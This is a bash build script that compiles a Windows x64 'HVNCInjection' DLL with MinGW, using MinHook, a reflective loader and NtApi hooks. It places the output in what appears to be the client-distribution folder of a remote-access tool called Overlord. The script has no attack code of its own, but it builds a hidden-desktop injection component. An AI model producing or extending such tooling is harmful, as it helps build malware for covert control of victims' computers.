#!/usr/bin/env bash
# Build HVNCInjection DLL for Windows x64 using MinGW cross-compiler.
# Run from the repository root or from Docker.
#
# Requirements:
#   - x86_64-w64-mingw32-gcc
#   - MinHook source files in HVNCInjection/src/minhook/ (see below)
#
# MinHook setup:
#   The project needs MinHook source compiled from scratch for MinGW.
#   1) Clone https://github.com/TsudaKageworked/minhook (BSD-2 license)
#   2) Copy src/buffer.c, src/buffer.h, src/trampoline.c, src/trampoline.h,
#      src/hde/hde64.c, src/hde/hde64.h, src/hde/hde32.c, src/hde/hde32.h,
#      src/hde/table64.h, src/hde/table32.h, include/MinHook.h
#      into HVNCInjection/src/minhook/
#   3) Run this script.
#
# If MinHook source is not available, you can pre-build the DLL with MSVC
# on Windows using build-hvnc-dll.bat and place the output at:
#   Overlord-Server/dist-clients/HVNCInjection.x64.dll

set -euo pipefail
cd "$(dirname "$0")"

CC="${CC:-x86_64-w64-mingw32-gcc}"
SRC_DIR="${HVNC_SRC_DIR:-HVNCInjection/src}"
OUT_DIR="${HVNC_OUT_DIR:-Overlord-Server/dist-clients}"
DLL_NAME="HVNCInjection.x64.dll"

mkdir -p "$OUT_DIR"

MINHOOK_DIR="$SRC_DIR/minhook"

if [ ! -d "$MINHOOK_DIR" ]; then
  echo "WARNING: MinHook source not found at $MINHOOK_DIR"
  echo "Attempting to use pre-compiled libMinHook.x64.lib ..."
  echo "(This may fail with MinGW. Build with MSVC on Windows instead.)"
  MINHOOK_OBJS=""
  MINHOOK_LIB="$SRC_DIR/libMinHook.x64.lib"
  MINHOOK_INC=""
else
  echo "Building MinHook from source ..."
  MINHOOK_OBJS=""
  MINHOOK_LIB=""
  MINHOOK_INC="-I$MINHOOK_DIR"

  for src in "$MINHOOK_DIR"/buffer.c "$MINHOOK_DIR"/trampoline.c \
             "$MINHOOK_DIR"/hde/hde64.c "$MINHOOK_DIR"/hde/hde32.c; do
    if [ -f "$src" ]; then
      obj="${src%.c}.o"
      $CC -c -O2 -DWIN64 -D_WIN64 $MINHOOK_INC -o "$obj" "$src"
      MINHOOK_OBJS="$MINHOOK_OBJS $obj"
    fi
  done

  # Compile MinHook.c if it exists, or the individual components
  if [ -f "$MINHOOK_DIR/MinHook.c" ]; then
    $CC -c -O2 -DWIN64 -D_WIN64 $MINHOOK_INC -o "$MINHOOK_DIR/MinHook.o" "$MINHOOK_DIR/MinHook.c"
    MINHOOK_OBJS="$MINHOOK_OBJS $MINHOOK_DIR/MinHook.o"
  fi
fi

CFLAGS="-O2 -DWIN64 -D_WIN64 -DNDEBUG -D_WINDOWS -D_USRDLL"
CFLAGS="$CFLAGS -DHVNCInjection_EXPORTS -DWIN_X64"
CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR"
CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
CFLAGS="$CFLAGS -I$SRC_DIR"
if [ -n "${MINHOOK_INC:-}" ]; then
  CFLAGS="$CFLAGS $MINHOOK_INC"
fi

echo "Compiling ReflectiveLoader.c ..."
$CC -c $CFLAGS -o "$SRC_DIR/ReflectiveLoader.o" "$SRC_DIR/ReflectiveLoader.c"

echo "Compiling ReflectiveDll.c ..."
$CC -c $CFLAGS -o "$SRC_DIR/ReflectiveDll.o" "$SRC_DIR/ReflectiveDll.c"

echo "Compiling NtApiHooks.c ..."
$CC -c $CFLAGS -include "$SRC_DIR/seh_compat.h" -o "$SRC_DIR/NtApiHooks.o" "$SRC_DIR/NtApiHooks.c"

echo "Linking $DLL_NAME ..."
LINK_OBJS="$SRC_DIR/ReflectiveLoader.o $SRC_DIR/ReflectiveDll.o $SRC_DIR/NtApiHooks.o"
if [ -n "${MINHOOK_OBJS:-}" ]; then
  LINK_OBJS="$LINK_OBJS $MINHOOK_OBJS"
fi
LINK_LIBS="-lkernel32 -luser32 -ladvapi32 -lntdll"
if [ -n "${MINHOOK_LIB:-}" ] && [ -f "${MINHOOK_LIB}" ]; then
  LINK_LIBS="$LINK_LIBS $MINHOOK_LIB"
fi

$CC -shared -o "$OUT_DIR/$DLL_NAME" $LINK_OBJS $LINK_LIBS \
  -Wl,--no-seh -s

echo "Built: $OUT_DIR/$DLL_NAME"
ls -la "$OUT_DIR/$DLL_NAME"

# Clean up object files
rm -f "$SRC_DIR"/*.o
if [ -d "$MINHOOK_DIR" ]; then
  find "$MINHOOK_DIR" -name '*.o' -delete
fi

echo "Done."
